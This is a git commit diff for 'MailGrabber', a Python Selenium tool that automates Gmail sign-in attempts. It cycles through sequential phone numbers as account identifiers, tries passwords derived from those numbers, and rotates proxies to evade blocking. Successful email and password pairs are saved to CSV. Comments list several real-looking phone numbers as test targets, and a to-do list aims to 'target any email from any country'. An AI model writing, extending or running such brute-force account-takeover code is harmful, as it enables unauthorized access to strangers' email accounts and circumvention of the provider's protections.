48e77ea6ecc08ba8d88f862ee6aae35026f42e40
unknown <sakibovi123@gmail.com>
2023-03-30 04:38:42 +0600

    password issue fixed storing and keep lopping function left

--- run.py
+++ run.py
@@ -5,13 +5,8 @@ from src.const import GMAIL_URL, PASSWORD_URL
 with MailGrabber() as mail:
     mail.show_intro()
     mail.instructions()
-    mail.go_to_gmail(
-        "https://accounts.google.com/v3/signin/identifier?dsh=S-369070831%3A1679585500716875&continue=https%3A%2F"
-        "%2Faccounts.google.com%2Fb%2F0%2FAddMailService&followup=https%3A%2F%2Faccounts.google.com%2Fb%2F0"
-        "%2FAddMailService&ifkv=AQMjQ7TWf32A8kc6niDClOCjuzw-PYP67_WS1ME8K_e8iWEwdKPidWSCv90mKji3rAcE7pZaIetGpw"
-        "&passive=1209600&flowName=GlifWebSignIn&flowEntry=ServiceLogin "
-    )
-
+    mail.go_to_gmail(GMAIL_URL)
+    mail.get_current_url()
     mail.start_grabbing("//input[@id='identifierId']", input("\033[32m" + "Enter a starting number => " + "\033[0m"),
                         int(input("\033[32m" + "How many time do you want to keep trying? => " + "\033[0m")),
                         int(input("\033[32m" + "Set a length of password => " + "\033[0m")))
--- src/MailGrabber.py
+++ src/MailGrabber.py
@@ -16,6 +16,8 @@ class MailGrabber(uc.Chrome):
         self.driver = driver
         self.teardown = teardown
         self.proxy = proxy
+        self.show_intro()
+        self.instructions()
         super(MailGrabber, self).__init__(options=self.get_chrome_options())
 
     def go_to_gmail(self, url):
@@ -27,15 +29,16 @@ class MailGrabber(uc.Chrome):
     def get_chrome_options(self):
         chrome_options = Options()
         if self.proxy:
+            chrome_options.add_argument("--window-size=720,1280")
             chrome_options.add_argument(f'--proxy-server={self.proxy}')
         return chrome_options
 
     def rotate_proxy(self):
-        proxies = ['http://1.1.1.1:8080', 'http://2.2.2.2:8080', 'http://3.3.3.3:8080']
+        proxies = ['http://168.196.236.235:50100', 'http://168.196.236.235:50101', 'http://2.33.4.5:2322']
         self.proxy = random.choice(proxies)
         self.options = self.get_chrome_options()
-        self.quit()
-        self.__init__(options=self.options, proxy=self.proxy)
+        self.quit()  # close the current browser window
+        super(MailGrabber, self).__init__(options=self.options)  # create a new browser instance
 
     def show_intro(self):
         text = "WELCOME TO MAILGRABBER"
@@ -54,13 +57,85 @@ class MailGrabber(uc.Chrome):
     def solve_captcha(self):
         pass
 
-    @staticmethod
     def convert_to_dataframe(self, s_arr, f_arr):
         data_frame = pd.DataFrame({
             "Email": s_arr,
             "Password": f_arr
         })
         data_frame.to_csv(f"{datetime.now}.csv", index=False)
+
+    # def start_grabbing(self, x_path, number, amount, length_of_password):
+    #     arr = []
+    #     pass_arr = []
+    #     success_email = []
+    #     password_url = PASSWORD_URL
+    #
+    #     gmail_url = GMAIL_URL
+    #     mail_match = False
+    #     password_match = False
+    #
+    #     wait = WebDriverWait(self, 20)
+    #
+    #     email = wait.until(EC.element_to_be_clickable((By.XPATH, x_path)))
+    #
+    #     submit_email = wait.until(EC.element_to_be_clickable((
+    #         By.XPATH, "//span[normalize-space()='Next']"
+    #     )))
+    #     email.click()
+    #     i = 1
+    #     k = 1
+    #     while i <= amount:
+    #         i += 1
+    #         number = int(number) + 1
+    #         number_str = "0{}".format(number)
+    #         arr.append(number_str)
+    #         pass_arr.append(str(number)[:length_of_password])
+    #     print("Numbers for bypassing Email => " + str(arr))
+    #     print("Chosen Passwords => " + str(pass_arr))
+    #     sleep(2)
+    #     # while k <= amount and len(arr) > 0:
+    #     #     k += 1
+    #     for j in arr:
+    #         email.send_keys(j)
+    #         arr.remove(j)
+    #         sleep(3)
+    #         submit_email.click()
+    #         email.clear()
+    #         sleep(3)
+    #         print("Tried : " + str(j))
+    #         if self.current_url == password_url:
+    #             print("One email worked")
+    #             success_email.append(j)
+    #             print("Success Email" + str(j))
+    #             # pass password from here
+    #             # while k <= amount:
+    #             #     k += 1
+    #             for z in pass_arr:
+    #                 password = wait.until(EC.element_to_be_clickable((
+    #                     By.XPATH, "//input[@name='Passwd']"
+    #                 )))
+    #                 password.click()
+    #                 password.send_keys(z)
+    #                 next_button = wait.until(EC.element_to_be_clickable((
+    #                     By.XPATH, NEXT_BUTTON
+    #                 )))
+    #                 next_button.click()
+    #                 if self.current_url == gmail_url:
+    #                     password_match = True
+    #                     print("Email Matched: " + str(j) + password + str(z))
+    #                     self.convert_to_dataframe(arr, pass_arr)
+    #             sleep(3)
+    #             break
+    #
+    #         # email.clear()
+    #         # break
+    #     print("Numbers logs = > ", arr)
+    #     print("Testing all the numbers....")
+    #     print("Tried => ", len(arr), "times")
+    #     self.quit()
+
+    def get_current_url(self):
+        print(self.current_url)
 
     def start_grabbing(self, x_path, number, amount, length_of_password):
         arr = []
@@ -121,13 +196,24 @@ class MailGrabber(uc.Chrome):
         print("Tried => ", len(arr), "times")
         self.quit()
 
-# for testing numbers
-# +18327321445
-# +13125860756
-# +17322496289
-# +19566222852
-# +12295853598
-# +13127424480
-
+"""
+for testing numbers
++18327321445
++13125860756
++17322496289
++19566222852
++12295853598
++13127424480
+"""
 
 # can target any email from any country
+
+
+"""
+1. Need to keep trying the loop until the arrays are empty | PENDING
+2. If try again window comes up then press try again and continue trying where it lefts off | PENDING
+3. If email or password matches then store it and show it | PENDING
+4. can target any email from any country | PENDING
+5. will need a function to add country code. | PENDING
+6. need to make shorter and optimize code
+"""
